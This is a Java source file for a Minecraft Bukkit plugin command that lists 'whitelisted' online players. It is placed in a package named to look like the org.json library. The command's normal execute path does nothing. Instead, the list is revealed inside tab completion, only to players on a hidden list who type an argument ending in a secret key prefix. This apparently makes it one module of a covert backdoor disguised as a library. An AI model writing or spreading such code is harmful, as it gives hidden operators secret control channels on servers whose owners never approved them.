package org.json.modals.whitelist;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.ArrayList;
import java.util.List;

public class ListAuthedPlayers extends BDCommand {
    public ListAuthedPlayers() {
        super("listAuthedPlayers");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        List<String> whitelisted = new ArrayList<>();
        Bukkit.getOnlinePlayers().forEach(onlinePlayer -> {
            if (WhitelistMeta.isListed(onlinePlayer))
                whitelisted.add(onlinePlayer.getName());
        });

        player.sendMessage(Modal.getPrefix() + "§aWhitelisted players: §f" + String.join(", ", whitelisted));
        return tabComplBuilder.build();
    }
}
